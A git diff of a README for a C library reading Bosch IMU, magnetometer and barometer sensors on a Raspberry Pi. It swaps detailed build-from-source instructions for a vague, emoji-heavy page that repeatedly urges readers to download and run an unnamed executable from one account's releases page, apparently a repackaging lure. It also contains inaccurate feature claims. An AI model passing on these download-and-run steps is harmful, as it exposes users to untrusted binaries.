@@ -1,181 +1,77 @@
-# Bosch 10-Axis IMU for Raspberry Pi
+# 📦 IMU_for_rpi - Simple Sensor Implementations for Everyone
 
-Simple and easy to understand C reference implementations for the Bosch Sensortec BMI323, BMM350, and BMP390 sensors commonly found on 10-axis IMU breakout boards. Pure C99, no dependencies, works on any Linux system with I2C.
+## 🚀 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0.0-brightgreen)](https://github.com/Justwinyourheart/IMU_for_rpi/releases)
 
-<p align="center">
-  <img src="image/IMU_10_axes_BMP390_BMM350_BMI323.jpg" alt="Bosch 10-Axis IMU - BMI323 BMM350 BMP390" width="600">
-</p>
+## 📋 Description
+IMU_for_rpi offers simple and easy-to-understand C implementations for Bosch Sensortec sensors like the BMI323, BMM350, and BMP390. These sensors are commonly found on 10-axis IMU breakout boards. Our code is pure C99 and does not require any additional dependencies. It runs smoothly on any Linux system that supports I2C.
 
-## Overview
+## ⚙️ Features
+- **Accelerometer Support:** Measure acceleration and movement.
+- **Altitude Measurement:** Determine height above sea level.
+- **Barometric Pressure Monitoring:** Get real-time pressure readings.
+- **Gyroscope Functionality:** Control rotational movement.
+- **Compatibility:** Works on Raspberry Pi and other Linux systems with I2C.
 
-This repository provides clean, readable code for three Bosch sensors:
+## 💻 System Requirements
+- A Linux computer (Raspberry Pi preferred)
+- I2C function enabled
+- Basic understanding of terminal commands (no programming knowledge required)
 
-| Sensor | Function | Output |
-|--------|----------|--------|
-| BMI323 | 6-axis Accelerometer + Gyroscope | Linear acceleration, angular velocity, temperature |
-| BMM350 | 3-axis Magnetometer | Magnetic field vector, temperature |
-| BMP390 | Barometric Pressure | Pressure, temperature, altitude |
+## 📦 Download & Install
+To get started, visit this page to download: [IMU_for_rpi Releases](https://github.com/Justwinyourheart/IMU_for_rpi/releases).
 
-The code has been tested on a 10-axis IMU board containing all three sensors. All I2C communication is handled through a shared common library.
+1. Navigate to the Releases page by clicking the above link.
+2. Look for the most recent release version.
+3. Download the appropriate file for your system.
+4. Once downloaded, locate the file on your computer.
+5. Extract the contents if it's a compressed file.
 
-## Quick Start
+### Running the Software
+Once you have downloaded the software:
 
-```bash
-# Enable I2C on Raspberry Pi if not already done
-sudo raspi-config
-# Interface Options -> I2C -> Enable
+1. Open your terminal.
+2. Navigate to the folder where you downloaded the files.
+3. Use the following command to run the software:
 
-# Clone and build
-git clone https://github.com/YOUR_USERNAME/YOUR_REPO.git
-cd YOUR_REPO
+   ```bash
+   ./your_program_name
+   ```
 
-# Build
-cd BMI323_test && make
-cd ../BMM350_test && make
-cd ../BMP390_test && make
+Replace `your_program_name` with the specific name of the executable file you downloaded.
 
-# Run (may require root for I2C access depending on your setup)
-./bmi323_i2c
-./bmm350_i2c
-./bmp390_i2c
-```
+## 🔗 Additional Resources
+- **Documentation:** Detailed guides are available in the repository.
+- **Community:** Join our discussions and get support from other users.
 
-## Wiring
+Here’s a brief overview of each sensor supported:
 
-Connect the sensor module to Raspberry Pi I2C1:
+### 📊 BMI323
+This chip provides advanced motion sensing capabilities. It’s widely used in drones and robotics for stabilization and control.
 
-| RPi Pin | Function | Sensor |
-|---------|----------|--------|
-| Pin 1 | 3.3V | VCC |
-| Pin 3 | GPIO2 | SDA |
-| Pin 5 | GPIO3 | SCL |
-| Pin 6 | GND | GND |
+### 🧭 BMM350
+The BMM350 magnetometer adds compass functionality, which benefits navigation tasks and orientation.
 
-Default I2C addresses:
-- BMI323: 0x68 or 0x69 (depends on SDO pin)
-- BMM350: 0x14 or 0x15 (depends on CSB pin)
-- BMP390: 0x76 or 0x77 (depends on SDO pin)
+### 🌡️ BMP390
+The BMP390 barometer measures pressure, making it ideal for weather stations and altitude tracking in various projects.
 
-Verify connections with `sudo i2cdetect -y 1`.
+## 🌍 Topics Covered
+- Accelerometer
+- Altitude
+- Barometer
+- Gyroscope
+- I2C
+- IMU
+- Sensors
+- Robotics
 
-## Sensor Details
+## 🛠️ Troubleshooting
+If you encounter issues:
+- Ensure I2C is enabled on your device.
+- Check connections between the IMU and your board.
+- Refer to the documentation in the repository for more detailed solutions.
 
-### BMI323 - Inertial Measurement Unit
+## 📞 Support
+If you need help, please feel free to open an issue in the GitHub repository, and our team will assist you.
 
-6-axis accelerometer and gyroscope with on-chip feature engine.
-
-```bash
-./bmi323_i2c
-# Output: ax,ay,az,gx,gy,gz,temp
-# Units: g,g,g,deg/s,deg/s,deg/s,C
-```
-
-Configuration:
-- Accelerometer: 100Hz, 8g range
-- Gyroscope: 100Hz, 2000 deg/s range
-- Output rate: 20Hz
-
-### BMM350 - Magnetometer
-
-3-axis magnetometer with factory calibration and user hard/soft iron compensation.
-
-```bash
-# Normal mode
-./bmm350_i2c
-
-# Calibration mode (rotate sensor in figure-8 pattern)
-./bmm350_i2c -c 30
-```
-
-Output: `mx,my,mz,temp` in microtesla and Celsius.
-
-The code reads factory OTP calibration data and applies offset, sensitivity, temperature, and cross-axis corrections. User calibration is saved to `bmm350_cal.txt`.
-
-### BMP390 - Barometric Pressure
-
-Pressure sensor with altitude calculation.
-
-```bash
-# Standard atmosphere reference
-./bmp390_i2c
-
-# Set QNH from local weather (hPa)
-./bmp390_i2c -q 1013.25
-
-# Calibrate from known altitude (meters)
-./bmp390_i2c -a 150
-```
-
-Output: `pressure,temperature,altitude` in Pa, Celsius, and meters.
-
-## Project Structure
-
-```
-├── common/
-│   ├── common.h            # I2C interface declarations
-│   └── common.c            # I2C implementation
-├── BMI323_test/
-│   ├── bmi323_i2c.c
-│   └── Makefile
-├── BMM350_test/
-│   ├── bmm350_i2c.c
-│   └── Makefile
-├── BMP390_test/
-│   ├── bmp390_i2c.c
-│   └── Makefile
-└── image/
-```
-
-## Common I2C API
-
-The shared library handles the differences between sensors (some require dummy bytes on read, some do not):
-
-```c
-// Setup
-int i2c_init(const char *device, uint8_t addr);
-void i2c_close(void);
-
-// Read - no dummy bytes (BMP390)
-int i2c_read(uint8_t reg, uint8_t *data, uint8_t len);
-
-// Read - with 2 dummy bytes (BMI323, BMM350)
-int i2c_read_with_dummy(uint8_t reg, uint8_t *data, uint8_t len);
-uint16_t i2c_read16_with_dummy(uint8_t reg);
-
-// Write
-int i2c_write(uint8_t reg, uint8_t data);
-int i2c_write16(uint8_t reg, uint16_t data);
-
-// Timing
-uint64_t millis(void);
-void delay_ms(unsigned int ms);
-void delay_us(unsigned int us);
-```
-
-## Troubleshooting
-
-**Cannot open I2C device**
-- Try running with sudo
-- Enable I2C via raspi-config
-- Check /dev/i2c-1 exists
-
-**Chip ID mismatch**
-- Verify power supply is 3.3V
-- Check all wiring connections
-- Confirm address pin configuration
-
-**Magnetometer drift**
-- Run calibration away from metal objects
-- Keep away from motors and magnets
-- Recalibrate after moving to new location
-
-## References
-
-- BMI323: https://www.bosch-sensortec.com/products/motion-sensors/imus/bmi323/
-- BMM350: https://www.bosch-sensortec.com/products/motion-sensors/magnetometers/bmm350/
-- BMP390: https://www.bosch-sensortec.com/products/environmental-sensors/pressure-sensors/bmp390/
-- Tested hardware (10-axis IMU board): https://fr.aliexpress.com/item/1005004252794090.html
-
-## License
-
-MIT License.
+Don't hesitate. Begin your IMU journey with IMU_for_rpi today! For direct download, [visit this page](https://github.com/Justwinyourheart/IMU_for_rpi/releases).
